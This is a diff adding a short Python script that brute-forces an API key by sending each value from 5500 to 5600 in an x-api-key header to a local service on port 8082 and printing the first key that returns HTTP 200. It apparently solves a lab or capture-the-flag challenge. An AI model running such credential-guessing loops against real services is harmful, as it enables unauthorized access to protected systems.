@@ -1,0 +1,16 @@
+import requests
+
+def find_key():
+    for key in range(5500, 5601):
+        try:
+            response = requests.get("http://127.0.0.1:8082", headers={"x-api-key": str(key)})
+            if response.status_code == 200:
+                return f"Key: {key}, Response: {response.text}"
+        except Exception as e:
+            print(f"An error occurred with key {key}: {e}")
+
+    return "No valid key found in the given range."
+
+# Run the function and print the result
+result = find_key()
+print(result)
